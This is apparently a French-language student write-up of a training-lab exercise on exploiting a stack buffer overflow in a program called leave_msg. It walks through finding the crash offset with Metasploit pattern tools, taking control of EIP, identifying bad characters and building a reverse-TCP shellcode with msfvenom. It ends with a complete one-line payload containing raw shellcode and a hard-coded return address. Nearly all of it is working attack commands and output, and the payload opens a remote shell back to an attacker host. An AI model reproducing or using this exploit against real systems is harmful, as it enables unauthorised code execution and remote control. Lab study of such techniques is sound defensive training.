# Buffer Overflows Overview [Pwn] Academy

`./leave_msg $(python -c 'print "\x55"*(2064-124-95-4)+ "\x90"*124 +"\xba\x9c\x2a\xad\x65\xda\xd2\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x12\x83\xc6\x04\x31\x56\x0e\x03\xca\x24\x4f\x90\xc3\xe3\x78\xb8\x70\x57\xd4\x55\x74\xde\x3b\x19\x1e\x2d\x3b\xc9\x87\x1d\x03\x23\xb7\x17\x05\x42\xdf\xd8\xf5\xb4\x1e\x4f\xf4\xb4\x5a\xe6\x71\x55\x2a\x9e\xd1\xc7\x19\xec\xd1\x6e\x7c\xdf\x56\x22\x16\x8e\x79\xb0\x8e\x26\xa9\x19\x2c\xde\x3c\x86\xe2\x73\xb6\xa8\xb2\x7f\x05\xaa"+"\x4c\xd6\xff\xff"')`

Ceci est le payload final du programme 

Tous d’abord il a fallut trouver la limite pour avoir une segmentation default avec metaploit 

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb - l 2100`

On l’injecte :

```bash
run $(python -c "print 'Aa0Aa1Aa2Aa3...6Cr7Cr8Cr9'")...

Program received signal SIGSEGV, Segmentation fault.
0x37714336 in ?? ()
```

Et on détermine la taille que nous allons avoir :

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37714336
[*] Exact match at offset 2060
```

Prendre le contrôle d’EIP 

```bash
run $(python -c "print '\x55' * 2060 + '\x66' * 4")
...
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

Ensuite trouvé quel sont les mauvais caractères de la même manière que le cours.

```bash
Buffer = "\x55" * (2064 - 256 - 4) = 1804
  CHARS = "\x00\x01\x02...\xfe\xff" # 256
    EIP = "\x66" * 4'
```

`\0x00\0x09\0x0a\0x20`

Créer un shellcode en prenant compte du programme et des mauvais caractères  :

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.x.x lport=4444 --bad-chars="\x00\x09\x0a\x20" --platform linux --format c
...
Payload size: 95 bytes
...
```

On pouvait déjà écrire cette formule :

```bash
Buffer = "\x55" * (2064 - 100 - 95 - 4)
      NOPs = "\x90" * 100
 Shellcode = "\xbd\x95\xf6...\x02\xce" #95
       EIP = "\x66" * 4'
```

Trouver une adresse pour le payload, j’ai choisi 0xffffd64c dans le payload on met

`“\x4c\xd6\xff\xff”`

Finalement nous nous retrouvons avec le payload tout en haut avec Les 2064 \x55\ nous  emmenant à l’EIP dont nous supprimons plusieurs partie pour écrire ensuite les NOPs que tout s’exécute simplement. Puis Notre shellcode. Et enfin notre adresse prenant l’EIP.

---

NOTE :

2064 car c’est ce que nous sort metasploit avec l’adresse `2060` + l’IEP `4` = 2064.